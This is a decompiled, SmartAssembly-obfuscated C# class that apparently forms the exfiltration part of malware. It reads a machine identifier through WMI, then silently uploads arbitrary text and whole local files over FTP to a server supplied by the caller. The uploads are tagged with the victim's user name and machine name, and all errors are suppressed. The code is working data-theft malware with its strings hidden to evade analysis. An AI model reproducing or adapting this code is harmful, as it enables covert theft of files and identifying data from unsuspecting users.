using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace maXgRZLUwUwi;

internal sealed class pkkGXNrkowS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string NOJMgYxKOBYDCh()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107407928));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107407939)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107407890);
			ManagementObject val3 = new ManagementObject(getString_0(107407917) + text + getString_0(107407876));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107407871)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107392893);
		}
	}

	public static void XPwCeKFjLVREhb(string xhpJCRBVMHt = "URL", string zVuSCEIsjWRcFO = "USERNAME", string OeGAZwMiBRdVuwjQ = "ACCESO", string ErkUkJDPakEpn = "")
	{
		try
		{
			string text = NOJMgYxKOBYDCh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(xhpJCRBVMHt + getString_0(107408105) + Environment.UserName + getString_0(107408060) + Environment.MachineName + getString_0(107408071) + text + getString_0(107408066));
			ftpWebRequest.Method = getString_0(107407846);
			ftpWebRequest.Credentials = new NetworkCredential(zVuSCEIsjWRcFO, OeGAZwMiBRdVuwjQ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(ErkUkJDPakEpn);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void XVoGcXcserch(string pLtwyxhPiaapO = "URL", string czLsAbGnaWmc = "USERNAME", string tSVhIjpEIwBbUn = "ACCESO", string oxmeSzzsThOcR = "")
	{
		try
		{
			string text = NOJMgYxKOBYDCh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(pLtwyxhPiaapO + getString_0(107408105) + Environment.UserName + getString_0(107408060) + Environment.MachineName + getString_0(107408071) + text + getString_0(107408071) + Path.GetFileName(oxmeSzzsThOcR));
			ftpWebRequest.Method = getString_0(107407846);
			ftpWebRequest.Credentials = new NetworkCredential(czLsAbGnaWmc, tSVhIjpEIwBbUn);
			byte[] array = File.ReadAllBytes(oxmeSzzsThOcR);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static pkkGXNrkowS()
	{
		Strings.CreateGetStringDelegate(typeof(pkkGXNrkowS));
	}
}
